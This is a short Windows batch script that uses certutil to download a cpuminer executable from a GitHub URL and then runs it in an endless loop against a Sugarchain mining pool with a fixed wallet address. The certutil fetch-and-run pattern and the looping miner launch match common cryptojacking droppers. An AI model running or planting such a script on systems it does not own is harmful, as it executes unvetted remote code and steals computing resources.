certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/mansoni/mine/main/cpuminer-sse2.exe" cpuminer-sse2.exe

:start

"%~dp0"cpuminer-sse2.exe -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q2g4c4ege83evtlf7hsp3lwphpfgtzc56ucykyf.test1

goto start

